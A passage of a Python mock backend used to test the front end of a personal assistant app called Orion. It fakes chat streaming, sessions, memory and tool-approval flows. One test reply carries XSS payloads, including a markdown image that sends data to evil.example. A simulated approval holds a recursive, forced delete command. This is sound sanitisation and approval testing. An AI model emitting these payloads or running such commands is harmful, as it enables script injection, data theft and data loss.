"""Backend de mentira para desenvolver e testar o front sem Qdrant/SurrealDB/modelos.

Imita os contratos do legado (`/sessoes`, `/historico`, `/metrics`, `/stats`, `/health`,
`/integracoes`, `/grafo/completo`, `/chat` em SSE...) e os eventos novos do `orion.app`
(`tool`, `approval`, `error` + `/approvals`). Serve também o próprio front em `/ui/`.

    uv run python -m tests.front_e2e.mock_backend          # http://127.0.0.1:8000
    MOCK_PORT=8123 MOCK_TOKEN= uv run python -m tests.front_e2e.mock_backend
"""

from __future__ import annotations

import asyncio
import json
import math
import os
import random
import secrets
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

import uvicorn
from fastapi import (
    Cookie,
    FastAPI,
    File,
    Form,
    Header,
    HTTPException,
    Response,
    UploadFile,
    WebSocket,
)
from fastapi.responses import JSONResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles

FRONT = Path(__file__).resolve().parents[2] / "Orion_Core" / "Front_end_Orion"
TOKEN = os.environ.get("MOCK_TOKEN", "")  # vazio = sem auth (como o legado)
LOGIN = os.environ.get("MOCK_LOGIN", "")  # senha do login por cookie (orion.app); vazio = sem login
SESSAO = "sessao-do-mock"
DEFAULT_PW = bool(os.environ.get("MOCK_DEFAULT_PW"))  # a senha do mock é a "de fábrica"

ESTADO: dict[str, Any] = {
    "mudo": False,
    "latencia": 1840,
    "chats": 128,
    "aprovacoes": {},
    "sessao_ativa": "s1",
    "titulos": {},  # renomeadas (PATCH /sessoes/{id})
    "fixadas": set(),
    "apagadas": set(),  # DELETE /sessoes/{id}: some da lista
    "projetos": {},  # id -> {nome, instrucoes, arquivado}
    "fatos": {
        1: {"texto": "Antônio estuda Sistemas de Informação na Unimar", "fonte": "conversa"},
        2: {"texto": "Prefere respostas curtas e diretas", "fonte": "manual"},
        3: {"texto": "Usa o Obsidian como segundo cérebro", "fonte": "vault"},
    },
    "resultados": {  # o id maior é o mais novo (a lista sai do mais novo para o mais antigo)
        1: {"nome": "diagrama.pdf", "tipo": "documento", "versao": 1, "texto": None},
        2: {
            "nome": "ata-reuniao.md",
            "tipo": "documento",
            "versao": 1,
            "texto": "# Ata\nDecisões da reunião.",
        },
        3: {
            "nome": "ata-reuniao.md",
            "tipo": "documento",
            "versao": 2,
            "texto": "# Ata v2\nDecisões revisadas.",
        },
    },  # fmt: skip
    "documentos": {},  # id -> {nome, trechos, projeto_id}
    "tela": {"ligada": True, "pausada": False, "registros": 42},
    "projeto_de": {},  # sessao -> id do projeto
    "arquivadas": set(),  # PATCH {"arquivada": true}: sai da barra, a busca ainda acha
    "rng": random.Random(7),
    "delay": 0.018,
}


def _agora() -> datetime:
    return datetime.now().replace(microsecond=0)


def _sessoes(arquivadas: bool = False) -> list[dict[str, Any]]:
    a = _agora()
    base = [
        ("s1", "Plano da fase 0: exportar os dados", a - timedelta(minutes=18)),
        ("s2", "Memória nova em SQLite com busca híbrida", a - timedelta(hours=5)),
        ("s3", "Dúvida de UML: diagrama de classes vs. sequência", a - timedelta(days=1, hours=2)),
        ("s4", "Backup diário do vault no iCloud", a - timedelta(days=2, hours=6)),
        ("s5", "Bot do Telegram com botões de aprovar", a - timedelta(days=4)),
        ("s6", "Resumo do PDF de Engenharia de Software", a - timedelta(days=9)),
        ("s7", "Ideias para a voz masculina do Orion", a - timedelta(days=21)),
    ]
    itens = [
        {
            "sessao_id": sid,
            "titulo": ESTADO["titulos"].get(sid, titulo),
            "criada": criada.isoformat(),
            "ultima_atividade": criada.isoformat(),
            "ativa": sid == ESTADO["sessao_ativa"],
            "favorita": sid in ESTADO["fixadas"],
            "arquivada": sid in ESTADO["arquivadas"],
            "projeto_id": ESTADO["projeto_de"].get(sid),
        }
        for sid, titulo, criada in base
        if sid not in ESTADO["apagadas"] and (sid in ESTADO["arquivadas"]) == arquivadas
    ]
    if arquivadas:
        return itens
    itens.append(
        {
            "sessao_id": "legado",
            "titulo": "conversas antigas (pré-sessões)",
            "criada": "",
            "ativa": False,
            "somente_leitura": True,
        }
    )
    return itens


RESPOSTA_XSS = """\
Teste de ataque (nada disto pode executar nem sair do app):

<img src=x onerror="window.__pwned=1">
<script>window.__pwned=2</script>

[clique aqui](javascript:window.__pwned=3)

![exfiltração](https://evil.example/leak?d=segredo)

[link legítimo](https://exemplo.com/pagina)
"""

RESPOSTA_LONGA = """\
Claro. Aqui está o plano da **fase 0**, em ordem de risco:

1. Rodar `backup_memoria` no PC e conferir as contagens.
2. Copiar `Orion_Ollama/.env` e `Orion_Core/google_auth/` para um lugar seguro.
3. Abrir o vault do Obsidian e confirmar que sincronizou.

## O que cada tabela guarda

| Tabela | Conteúdo | Vai para a memória nova? |
|---|---|---|
| `evento` | conversas | sim |
| `sessao` | sessões | sim |
| `lembrete` | lembretes | depois |
| `prompt` | prompts salvos | depois |

Para conferir o export, este trecho mostra as contagens:

```python
import json
from pathlib import Path

pasta = Path("backup")
for arq in sorted(pasta.glob("*.json")):
    dados = json.loads(arq.read_text(encoding="utf-8"))
    print(f"{arq.stem:<12} {len(dados):>7} registros")
```

> Só apague qualquer coisa do PC **depois** de abrir os arquivos de export e ver os números.

Detalhes em [ORION_NUCLEO.md](https://github.com/antoniossalomao/Orion) e [a documentação do SQLite](https://sqlite.org/fts5.html).
Quer que eu monte o roteiro em formato de checklist?
"""

RESPOSTA_CURTA = "Entendido, Antônio. Estou pronto para o que vier."

HISTORICOS: dict[str, list[tuple[str, str]]] = {
    "s1": [
        ("user", "Qual é o plano para a fase 0 antes de eu vender o PC?"),
        ("assistant", RESPOSTA_LONGA),
        ("user", "Perfeito. E o vault do Obsidian?"),
        (
            "assistant",
            "O vault já está no iCloud; só **confira a sincronização** antes de formatar.\n\n- Abra o app no celular.\n- Veja se a nota mais recente aparece.\n- Anote a data da última sincronização.",
        ),
    ],
    "s2": [
        ("user", "Explique a busca híbrida da memória nova"),
        (
            "assistant",
            "A busca combina **FTS5** (palavra-chave) e **vetores** com fusão por RRF:\n\n```sql\nSELECT t.id, bm25(facts_fts) AS rank\nFROM facts_fts JOIN facts t ON t.id = facts_fts.rowid\nWHERE facts_fts MATCH ?\nORDER BY rank\nLIMIT 10;\n```\n\nSe o embedder cair, a busca segue só por palavra-chave.",
        ),
    ],
}


def _historico(sid: str) -> list[dict[str, Any]]:
    t = _agora() - timedelta(minutes=40)
    saida = []
    for i, (papel, texto) in enumerate(
        HISTORICOS.get(sid, [("user", "Oi, Orion."), ("assistant", RESPOSTA_CURTA)])
    ):
        saida.append(
            {
                "role": papel,
                "content": texto,
                "timestamp": (t + timedelta(minutes=i * 2)).isoformat(),
            }
        )
    return saida


def _grafo(limite: int) -> dict[str, Any]:
    rng = random.Random(3)
    temas = [
        "memória",
        "sqlite",
        "telegram",
        "tailscale",
        "voz",
        "python",
        "fase 0",
        "mcp",
        "backup",
        "notebook",
        "obsidian",
        "agenda",
        "uml",
        "java",
        "unimar",
        "orion",
    ]
    frases = [
        "Exportar as tabelas pessoais antes da venda do PC",
        "Memória nova em SQLite com busca híbrida",
        "Bot do Telegram como canal principal no celular",
        "Acesso de fora pela rede do Tailscale",
        "Voz masculina com palavra de ativação",
        "Backup diário do arquivo de memória",
        "Diagrama de classes mostra herança e associação",
        "Resumo do capítulo sobre padrões de projeto",
    ]
    nodes = [{"id": f"topico:{t}", "tipo": "topico", "label": t} for t in temas]
    links: list[dict[str, str]] = []
    n = min(limite, 90)
    agora = _agora()
    for i in range(n):
        eid = f"evento:e{i}"
        nodes.append(
            {
                "id": eid,
                "tipo": "evento",
                "label": frases[i % len(frases)],
                "ator": "Antônio" if i % 2 == 0 else "Orion",
                "ts": (agora - timedelta(hours=i * 3)).isoformat(),
            }
        )
        for k in range(rng.choice([1, 2, 2, 3])):
            links.append(
                {
                    "source": eid,
                    "target": f"topico:{temas[(i * 3 + k * 5) % len(temas)]}",
                    "rel": "sobre",
                }
            )
        if i:
            links.append({"source": eid, "target": f"evento:e{i - 1}", "rel": "precedeu"})
    return {"nodes": nodes, "links": links, "total_nodes": len(nodes), "total_links": len(links)}


def _sse(obj: dict[str, Any] | str) -> str:
    corpo = obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False)
    return f"data: {corpo}\n\n"


def _wav_mudo(segundos: float) -> bytes:
    """WAV de silêncio (8 kHz, 8 bits, mono): um áudio que o navegador toca de verdade."""
    n = int(8000 * segundos)
    cab = (
        b"RIFF" + (36 + n).to_bytes(4, "little") + b"WAVEfmt " + (16).to_bytes(4, "little")
        + (1).to_bytes(2, "little") + (1).to_bytes(2, "little") + (8000).to_bytes(4, "little")
        + (8000).to_bytes(4, "little") + (1).to_bytes(2, "little") + (8).to_bytes(2, "little")
        + b"data" + n.to_bytes(4, "little")
    )  # fmt: skip
    return cab + b"\x80" * n


async def _pedacos(texto: str, delay: float):
    i = 0
    while i < len(texto):
        n = ESTADO["rng"].choice([2, 3, 4, 6, 9])
        yield texto[i : i + n]
        i += n
        await asyncio.sleep(delay)


def _auth(authorization: str | None, orion_session: str | None = None) -> None:
    if LOGIN:
        if orion_session != SESSAO:
            raise HTTPException(401, "login necessário")
        return
    if TOKEN and (authorization or "").removeprefix("Bearer ").strip() != TOKEN:
        raise HTTPException(401, "token inválido")


def create_app() -> FastAPI:
    app = FastAPI(title="Orion (mock)")

    @app.get("/api-info")
    def info() -> dict[str, Any]:
        return {"mock": True, "token": bool(TOKEN), "login": bool(LOGIN)}

    @app.get("/auth/status")
    def auth_status(orion_session: str | None = Cookie(default=None)) -> dict[str, bool]:
        # o legado real responde 404 aqui (ruído só no console do navegador); o mock responde
        # "sem senha" para os testes seguirem sem erro de console
        autenticado = bool(LOGIN) and orion_session == SESSAO
        saida = {"configured": bool(LOGIN), "authenticated": autenticado, "token_auth": bool(TOKEN)}
        if autenticado:  # como o orion.app: só depois do login diz que a senha é a de fábrica
            saida["default_password"] = bool(ESTADO.get("senha_de_fabrica", DEFAULT_PW))
        return saida

    if LOGIN:

        @app.post("/auth/login")
        def auth_login(corpo: dict[str, Any], response: Response) -> dict[str, bool]:
            if corpo.get("senha") == "bloqueada":
                raise HTTPException(429, "muitas tentativas", headers={"Retry-After": "30"})
            if corpo.get("senha") != ESTADO.get("senha", LOGIN) or corpo.get("usuario") != "admin":
                raise HTTPException(401, "usuário ou senha incorretos")
            response.set_cookie("orion_session", SESSAO, httponly=True, samesite="strict")
            return {"ok": True}

        @app.post("/auth/password")
        def auth_password(corpo: dict[str, Any], orion_session: str | None = Cookie(default=None)):
            if orion_session != SESSAO:
                raise HTTPException(401, "login necessário")
            if corpo.get("senha_atual") != ESTADO.get("senha", LOGIN):
                raise HTTPException(401, "senha atual incorreta")
            if len(str(corpo.get("nova", ""))) < 12:
                raise HTTPException(422, "a senha precisa de pelo menos 12 caracteres")
            ESTADO["senha"], ESTADO["senha_de_fabrica"] = corpo["nova"], False
            return {"ok": True}

        @app.post("/auth/logout")
        def auth_logout(response: Response) -> dict[str, bool]:
            response.delete_cookie("orion_session")
            return {"ok": True}

    @app.get("/health")
    def health() -> dict[str, Any]:
        return {
            "cerebro": {"ok": True, "embedder": True, "bm25": True},
            "qdrant": {"ok": True, "latencia_ms": 4.2, "vetores": {"orion_memory": 3_091_204}},
            "surreal": {"ok": True, "latencia_ms": 11.8},
            "vram": {"usada_mb": 3120, "total_mb": 8192, "gpu_pct": 22},
            "latencia_ultimo_chat_ms": ESTADO["latencia"],
        }

    @app.get("/")
    def raiz() -> dict[str, Any]:
        return {"servico": "Orion cerebro_maestro (mock)", "ativo": True, "versao": "2.1"}

    @app.get("/metrics")
    def metrics() -> dict[str, Any]:
        t = time.time()
        ESTADO["latencia"] = int(1800 + 900 * math.sin(t / 7) + ESTADO["rng"].randint(-120, 120))
        return {
            "latencia_ms": ESTADO["latencia"],
            "cpu_pct": round(28 + 18 * math.sin(t / 5) + ESTADO["rng"].random() * 6, 1),
            "ram_pct": round(61 + 3 * math.sin(t / 30), 1),
            "gpu_pct": int(20 + 15 * math.sin(t / 9) ** 2 * 3),
            "vram_pct": 38,
        }

    @app.get("/stats")
    def stats() -> dict[str, Any]:
        return {
            "total_chats": ESTADO["chats"],
            "iniciado_em": _agora().isoformat(),
            "tiers": {
                "Groq": {"usos": 91, "falhas": 4, "latencia_media_ms": 1210, "taxa_sucesso": 95.8},
                "Gemini": {
                    "usos": 29,
                    "falhas": 1,
                    "latencia_media_ms": 2480,
                    "taxa_sucesso": 96.7,
                },
                "Claude": {
                    "usos": 8,
                    "falhas": 0,
                    "latencia_media_ms": 7320,
                    "taxa_sucesso": 100.0,
                },
            },
            "distribuicao_pct": {"Groq": 71.1, "Gemini": 22.7, "Claude": 6.2},
        }

    @app.get("/stats/historico")
    def stats_historico(limite: int = 48) -> dict[str, Any]:
        base = 40
        return {"snapshots": [{"total_chats": base + i * 2 + (i % 5)} for i in range(limite)]}

    @app.get("/integracoes")
    def integracoes() -> dict[str, Any]:
        return {
            "telegram": {"online": True, "status": "bot rodando"},
            "voz_live": {"online": False, "status": "pronta — clique no botão de voz live"},
            "mic": {"online": False, "status": "mic_engine.py parado"},
            "tts": {
                "online": not ESTADO["mudo"],
                "status": "mudo" if ESTADO["mudo"] else "respondendo por voz",
            },
            "enxame": {"online": True, "status": "disponível via /enxame"},
            "upload": {"online": True, "status": "imagem · áudio · vídeo"},
        }

    @app.get("/memoria/categorias")
    def categorias() -> dict[str, Any]:
        return {
            "total_colecao": 3_091_204,
            "categorias_distintas": 5,
            "por_categoria": {
                "episodio": 1_204,
                "conhecimento_geral": 1_112_246,
                "conversa_geral": 1_001_379,
                "programacao": 238_857,
                "instrucao_ptbr": 325_410,
            },
        }

    @app.get("/grafo/completo")
    def grafo(limite: int = 300) -> dict[str, Any]:
        return _grafo(limite)

    @app.get("/sessoes")
    def sessoes() -> dict[str, Any]:
        itens = _sessoes()
        return {"total": len(itens), "sessoes": itens, "ativa": ESTADO["sessao_ativa"]}

    @app.post("/sessoes")
    def sessao_nova() -> dict[str, Any]:
        ESTADO["sessao_ativa"] = "s1"
        return {"ok": True, "sessao_id": "s1"}

    @app.post("/sessoes/ativar")
    def sessao_ativar(corpo: dict[str, Any]) -> dict[str, Any]:
        sid = corpo.get("sessao_id", "s1")
        ESTADO["sessao_ativa"] = sid
        ESTADO["arquivadas"].discard(sid)  # como o cérebro: abrir uma arquivada a desarquiva
        return {"ok": True, "sessao_id": sid, "mensagens": _historico(sid)}

    def _projeto(pid: int) -> dict[str, Any]:
        p = ESTADO["projetos"][pid]
        return {"id": pid, "nome": p["nome"], "instrucoes": p["instrucoes"],
                "arquivado": p["arquivado"], "atualizado": _agora().isoformat()}  # fmt: skip

    @app.get("/projetos")
    def projetos_listar(arquivados: bool = False) -> dict[str, Any]:
        itens = [_projeto(i) for i, p in ESTADO["projetos"].items() if p["arquivado"] == arquivados]
        return {"total": len(itens), "projetos": itens}

    @app.post("/projetos", status_code=201)
    def projetos_criar(corpo: dict[str, Any]) -> dict[str, Any]:
        nome = str(corpo.get("nome", "")).strip()
        if not nome or any(p["nome"].lower() == nome.lower() for p in ESTADO["projetos"].values()):
            raise HTTPException(409, "já existe um projeto com esse nome")
        pid = max(ESTADO["projetos"], default=0) + 1
        ESTADO["projetos"][pid] = {"nome": nome, "instrucoes": str(corpo.get("instrucoes", "")),
                                   "arquivado": False}  # fmt: skip
        return {"ok": True, "projeto": _projeto(pid)}

    @app.patch("/projetos/{pid}")
    def projetos_ajustar(pid: int, corpo: dict[str, Any]) -> dict[str, Any]:
        if pid not in ESTADO["projetos"]:
            raise HTTPException(404, "projeto não encontrado")
        for k_api, k in (
            ("nome", "nome"),
            ("instrucoes", "instrucoes"),
            ("arquivado", "arquivado"),
        ):
            if k_api in corpo and corpo[k_api] is not None:
                ESTADO["projetos"][pid][k] = corpo[k_api]
        return {"ok": True, "projeto": _projeto(pid)}

    @app.delete("/projetos/{pid}")
    def projetos_apagar(pid: int) -> dict[str, Any]:
        if ESTADO["projetos"].pop(pid, None) is None:
            raise HTTPException(404, "projeto não encontrado")
        return {"ok": True}

    def _fato(fid: int) -> dict[str, Any]:
        f = ESTADO["fatos"][fid]
        return {"id": fid, "texto": f["texto"], "fonte": f["fonte"],
                "criado": _agora().isoformat(), "atualizado": _agora().isoformat()}  # fmt: skip

    @app.get("/memoria/fatos")
    def fatos_listar(q: str | None = None) -> dict[str, Any]:
        itens = [
            _fato(i) for i, f in ESTADO["fatos"].items() if not q or q.lower() in f["texto"].lower()
        ]
        return {"total": len(itens), "fatos": itens}

    @app.patch("/memoria/fatos/{fid}")
    def fatos_corrigir(fid: int, corpo: dict[str, Any]) -> dict[str, Any]:
        if fid not in ESTADO["fatos"]:
            raise HTTPException(404, "fato não encontrado")
        ESTADO["fatos"][fid].update(texto=str(corpo["texto"]), fonte="manual")
        return {"ok": True, "fato": _fato(fid)}

    @app.delete("/memoria/fatos/{fid}")
    def fatos_esquecer(fid: int) -> dict[str, Any]:
        if ESTADO["fatos"].pop(fid, None) is None:
            raise HTTPException(404, "fato não encontrado")
        return {"ok": True}

    @app.get("/resultados")
    def resultados_listar() -> dict[str, Any]:
        itens = [
            {"id": i, "nome": r["nome"], "tipo": r["tipo"], "versao": r["versao"], "anterior": None,
             "bytes": 2048, "ferramenta": "gerar_documento", "conversa": "Dúvida de UML",
             "sessao_id": "s3", "projeto_id": None, "criado": _agora().isoformat(),
             "previa": "texto" if r["texto"] else None}
            for i, r in sorted(ESTADO["resultados"].items(), reverse=True)
        ]  # fmt: skip
        return {"total": len(itens), "resultados": itens}

    @app.get("/resultados/{rid}/texto")
    def resultados_texto(rid: int) -> dict[str, Any]:
        r = ESTADO["resultados"].get(rid)
        if not r or not r["texto"]:
            raise HTTPException(404, "resultado não encontrado")
        return {"texto": r["texto"], "truncado": False}

    @app.get("/resultados/{rid}/arquivo")
    def resultados_arquivo(rid: int) -> Response:
        r = ESTADO["resultados"].get(rid)
        if not r:
            raise HTTPException(404, "resultado não encontrado")
        return Response(
            (r["texto"] or "pdf").encode(),
            media_type="application/octet-stream",
            headers={"Content-Disposition": f'attachment; filename="{r["nome"]}"'},
        )

    @app.delete("/resultados/{rid}")
    def resultados_apagar(rid: int) -> dict[str, Any]:
        if ESTADO["resultados"].pop(rid, None) is None:
            raise HTTPException(404, "resultado não encontrado")
        return {"ok": True}

    @app.get("/memoria/documentos")
    def documentos_listar() -> dict[str, Any]:
        itens = [{"id": i, "nome": d["nome"], "titulo": d["nome"], "trechos": d["trechos"],
                  "projeto_id": d["projeto_id"], "indexado": _agora().isoformat()}
                 for i, d in ESTADO["documentos"].items()]  # fmt: skip
        return {"total": len(itens), "documentos": itens}

    @app.post("/memoria/documentos", status_code=201)
    async def documentos_enviar(
        arquivo: UploadFile, projeto_id: int | None = Form(default=None)
    ) -> dict[str, Any]:
        if not arquivo.filename or not arquivo.filename.lower().endswith(
            (".txt", ".md", ".pdf", ".docx")
        ):
            raise HTTPException(415, "tipo não suportado")
        corpo = await arquivo.read()
        if any(d["nome"] == arquivo.filename for d in ESTADO["documentos"].values()):
            return {
                "ok": True,
                "resultado": "same",
                "caracteres": len(corpo),
                "trechos": 2,
                "id": 0,
            }
        did = max(ESTADO["documentos"], default=0) + 1
        ESTADO["documentos"][did] = {
            "nome": arquivo.filename,
            "trechos": 3,
            "projeto_id": projeto_id,
        }
        return {"ok": True, "resultado": "new", "caracteres": len(corpo), "trechos": 3, "id": did}

    @app.delete("/memoria/documentos/{did}")
    def documentos_apagar(did: int) -> dict[str, Any]:
        if ESTADO["documentos"].pop(did, None) is None:
            raise HTTPException(404, "documento não encontrado")
        return {"ok": True}

    @app.get("/tela")
    def tela_estado() -> dict[str, Any]:
        t = ESTADO["tela"]
        return {**t, "hoje": min(t["registros"], 12), "gravadas": 3, "excluidas": 1}

    @app.post("/tela/pausa")
    def tela_pausa(corpo: dict[str, Any]) -> dict[str, Any]:
        ESTADO["tela"]["pausada"] = not corpo["ativa"]
        return {"pausada": ESTADO["tela"]["pausada"]}

    @app.delete("/tela")
    def tela_limpar() -> dict[str, Any]:
        n, ESTADO["tela"]["registros"] = ESTADO["tela"]["registros"], 0
        return {"ok": True, "apagados": n}

    @app.get("/sessoes/busca")
    def sessao_busca(q: str, limite: int = 10) -> dict[str, Any]:
        termo = q.casefold()
        achados = []
        for item in _sessoes() + _sessoes(arquivadas=True):
            sid = item["sessao_id"]
            for m in _historico(sid) if sid != "legado" else []:
                pos = m["content"].casefold().find(termo)
                if pos >= 0:
                    trecho = m["content"][max(0, pos - 20) : pos + len(termo) + 20]
                    achados.append({**item, "trecho": trecho})
                    break
        return {"total": len(achados[:limite]), "resultados": achados[:limite]}

    @app.patch("/sessoes/{sid}")
    def sessao_ajustar(sid: str, corpo: dict[str, Any]) -> dict[str, Any]:
        todas = _sessoes() + _sessoes(arquivadas=True)
        if sid not in {i["sessao_id"] for i in todas} or sid == "legado":
            raise HTTPException(404, "conversa não encontrada")
        if "projeto_id" in corpo:
            if corpo["projeto_id"] is None:
                ESTADO["projeto_de"].pop(sid, None)
            elif corpo["projeto_id"] in ESTADO["projetos"]:
                ESTADO["projeto_de"][sid] = corpo["projeto_id"]
            else:
                raise HTTPException(404, "projeto não encontrado")
        if "arquivada" in corpo:
            (ESTADO["arquivadas"].add if corpo["arquivada"] else ESTADO["arquivadas"].discard)(sid)
            ESTADO["fixadas"].discard(sid)
            if corpo["arquivada"] and ESTADO["sessao_ativa"] == sid:
                restantes = [i["sessao_id"] for i in _sessoes() if i["sessao_id"] != "legado"]
                ESTADO["sessao_ativa"] = restantes[0] if restantes else "s1"
        if "titulo" in corpo:
            ESTADO["titulos"][sid] = str(corpo["titulo"])
        if "favorita" in corpo:
            (ESTADO["fixadas"].add if corpo["favorita"] else ESTADO["fixadas"].discard)(sid)
        return {"ok": True}

    @app.delete("/sessoes/{sid}")
    def sessao_apagar(sid: str) -> dict[str, Any]:
        if sid not in {i["sessao_id"] for i in _sessoes()} or sid == "legado":
            raise HTTPException(404, "conversa não encontrada")
        ESTADO["apagadas"].add(sid)
        ESTADO["fixadas"].discard(sid)
        if ESTADO["sessao_ativa"] == sid:  # como o cérebro de verdade: a mais recente que sobrou
            restantes = [i["sessao_id"] for i in _sessoes() if i["sessao_id"] != "legado"]
            ESTADO["sessao_ativa"] = restantes[0] if restantes else "s1"
        return {"ok": True}

    @app.get("/historico")
    def historico(sessao: str | None = None) -> dict[str, Any]:
        msgs = _historico(sessao or ESTADO["sessao_ativa"])
        return {"total": len(msgs), "mensagens": msgs}

    @app.delete("/historico")
    def historico_limpar() -> dict[str, Any]:
        return {"ok": True, "mensagem": "Histórico em memória limpo."}

    @app.get("/exportar")
    def exportar() -> dict[str, Any]:
        msgs = _historico(ESTADO["sessao_ativa"])
        md = "\n\n".join(
            f"**{'Antônio' if m['role'] == 'user' else 'Orion'}**: {m['content']}" for m in msgs
        )
        return {"markdown": f"# Conversa com o Orion\n\n{md}", "total_msgs": len(msgs)}

    @app.post("/tts/mudo")
    def tts_mudo(corpo: dict[str, Any]) -> dict[str, Any]:
        ESTADO["mudo"] = bool(corpo.get("mudo"))
        return {"ok": True, "tts_mudo": ESTADO["mudo"]}

    @app.post("/tts/falar")
    def tts_falar(corpo: dict[str, Any]) -> dict[str, Any]:
        return {"ok": True}

    @app.post("/upload")
    async def upload(file: UploadFile = File(...)) -> dict[str, Any]:  # noqa: B008
        dados = await file.read()
        return {
            "ok": True,
            "path": f"C:\\Orion\\cache\\uploads\\{file.filename}",
            "nome": file.filename,
            "bytes": len(dados),
        }

    # ── voz por clique (fase 6): cada fala gravada recebe um turno roteirizado ─────
    # Fala de 4001 bytes = turno lento (para testar "parar a resposta"); `cancel` o interrompe.
    @app.websocket("/ws/voz")
    async def ws_voz(ws: WebSocket) -> None:
        await ws.accept()

        async def turno(tamanho: int) -> None:
            await ws.send_json({"type": "heard", "text": "que horas são"})
            if tamanho == 4001:
                await asyncio.sleep(30)
            await ws.send_json(
                {"type": "ev", "ev": {"text": f"São três e meia ({tamanho} bytes)."}}
            )
            await ws.send_json({"type": "audio", "mime": "audio/mpeg"})
            await ws.send_bytes(_wav_mudo(3.0))  # 3 s de silêncio: dá tempo de apertar "parar"
            await ws.send_json({"type": "done"})

        tarefa: asyncio.Task[None] | None = None
        while True:
            msg = await ws.receive()
            if msg["type"] == "websocket.disconnect":
                if tarefa is not None:
                    tarefa.cancel()
                return
            if msg.get("bytes"):
                ESTADO["falas"] = ESTADO.get("falas", 0) + 1
                tarefa = asyncio.create_task(turno(len(msg["bytes"])))
            elif msg.get("text") and tarefa is not None:
                if json.loads(msg["text"]).get("cmd") == "cancel":
                    tarefa.cancel()
                    ESTADO["falas_canceladas"] = ESTADO.get("falas_canceladas", 0) + 1
                    await ws.send_json({"type": "done"})

    # ── voz ao vivo (B): ecoa um turno quando chega áudio; conta o que recebeu ─────
    @app.websocket("/ws/voice")
    async def ws_voice(ws: WebSocket) -> None:
        await ws.accept()
        if ws.query_params.get("falha"):  # voz ao vivo desligada no servidor
            await ws.send_json(
                {"type": "error", "msg": "voz ao vivo desligada (ORION_VOICE_LIVE_ENABLED)"}
            )
            await ws.close()
            return
        ESTADO["live_sessoes"] = ESTADO.get("live_sessoes", 0) + 1
        respondeu = False
        while True:
            msg = await ws.receive()
            if msg["type"] == "websocket.disconnect":
                return
            dados = msg.get("bytes")
            if dados:
                ESTADO["live_bytes"] = ESTADO.get("live_bytes", 0) + len(dados)
                ESTADO["live_quadros"] = ESTADO.get("live_quadros", 0) + 1
                if not respondeu:  # um turno só: responde ao primeiro áudio
                    respondeu = True
                    await ws.send_bytes(b"\x00\x01" * 480)
                    await ws.send_json({"type": "heard", "text": "oi orion"})
                    await ws.send_json({"type": "text", "text": "Olá da voz ao vivo."})
                    await ws.send_json({"type": "done"})
            elif msg.get("text"):
                cmd = json.loads(msg["text"]).get("cmd")
                if cmd == "stop":
                    ESTADO["live_stop"] = ESTADO.get("live_stop", 0) + 1
                    await ws.close()
                    return

    @app.get("/voz-stats")
    def voz_stats() -> dict[str, Any]:
        return {k: v for k, v in ESTADO.items() if k.startswith(("live_", "falas"))}

    # ── chat ───────────────────────────────────────────────────────────────
    @app.post("/chat")
    async def chat(
        corpo: dict[str, Any],
        authorization: str | None = Header(default=None),
        orion_session: str | None = Cookie(default=None),
    ) -> StreamingResponse:
        _auth(authorization, orion_session)
        texto = str(corpo.get("texto", ""))
        baixo = texto.lower()

        async def gerar():
            ESTADO["chats"] += 1
            if "falha" in baixo:
                yield _sse({"error": "nenhum modelo respondeu: gateway indisponível"})
                yield _sse("[DONE]")
                return
            yield _sse(
                {
                    "tier": "Groq"
                    if corpo.get("modelo") in (None, "auto", "groq")
                    else str(corpo["modelo"]).title()
                }
            )
            if (
                "duas vezes" in baixo
            ):  # a mesma ferramenta chamada duas vezes: uma negada, uma permitida
                yield _sse(
                    {
                        "tool": {
                            "name": "ler_arquivo",
                            "decision": "deny",
                            "reason": "fora da pasta segura",
                        }
                    }
                )
                yield _sse({"tool": {"name": "ler_arquivo", "decision": "allow", "reason": ""}})
                async for p in _pedacos(
                    "Tentei duas vezes: a primeira foi negada, a segunda deu certo.",
                    ESTADO["delay"],
                ):
                    yield _sse({"text": p})
                yield _sse("[DONE]")
                return
            if "apag" in baixo or "aprov" in baixo or "comando" in baixo:
                aid = secrets.token_urlsafe(6)
                args = {"cmd": "Remove-Item C:\\Users\\anton\\Downloads\\antigos -Recurse -Force"}
                grande = "enorme" in baixo  # o servidor corta a exibição e avisa (args_truncated)
                if grande:
                    args = {"cmd": "echo ok " + "x" * 1990 + "…"}
                ESTADO["aprovacoes"][aid] = {"status": "pending", "args": args}
                yield _sse(
                    {
                        "tool": {
                            "name": "executar_comando",
                            "decision": "confirm",
                            "reason": "execução fora da lista de leitura segura",
                        }
                    }
                )
                yield _sse(
                    {
                        "approval": {
                            "id": aid,
                            "tool": "executar_comando",
                            "reason": "execução fora da lista de leitura segura: 'remove-item' fora da lista de leitura segura",
                            "args": args,
                            "args_truncated": grande,
                        }
                    }
                )
                if (
                    "devagar" in baixo
                ):  # a aprovação chega e o texto final demora: simula o clique cedo
                    await asyncio.sleep(1.5)
                async for p in _pedacos(
                    "Preciso da sua **aprovação** para rodar esse comando. Aprove ou negue pelo cartão acima.",
                    ESTADO["delay"],
                ):
                    yield _sse({"text": p})
                yield _sse("[DONE]")
                return
            if "memória" in baixo or "memoria" in baixo or "lembra" in baixo:
                yield _sse({"tool": {"name": "buscar_memoria", "decision": "allow", "reason": ""}})
                await asyncio.sleep(0.5)
            resposta = (
                RESPOSTA_XSS
                if "xss" in baixo
                else (RESPOSTA_CURTA if len(texto) < 12 else RESPOSTA_LONGA)
            )
            if "lento" in baixo:
                await asyncio.sleep(2.5)
            async for p in _pedacos(resposta, ESTADO["delay"]):
                yield _sse({"text": p})
            yield _sse("[DONE]")

        return StreamingResponse(gerar(), media_type="text/event-stream")

    @app.get("/painel")
    def painel(
        authorization: str | None = Header(default=None),
        orion_session: str | None = Cookie(default=None),
    ) -> dict[str, Any]:
        """Painel único (orion.painel) com um cenário que mostra quase tudo: um endpoint em
        quarentena por cota, uma CLI esgotada, uma não instalada, uma aprovação, decisões."""
        _auth(authorization, orion_session)
        agora = time.time()
        pendentes = [k for k, v in ESTADO["aprovacoes"].items() if v["status"] == "pending"]
        return {
            "gerado_em": agora,
            "uptime_s": 7260,
            "modelos": {
                "configurado": True,
                "endpoints": [
                    {
                        "nome": "omniroute",
                        "modelo": "gemini-2.5-flash",
                        "camada": "padrão",
                        "chamadas": 40,
                        "ok": 38,
                        "falhas": 2,
                        "limitada": 0,
                        "pulos": 0,
                        "quarentena_s": 0,
                        "ultimo_ok": agora - 90,
                        "ultimo_erro": "HTTP 502",
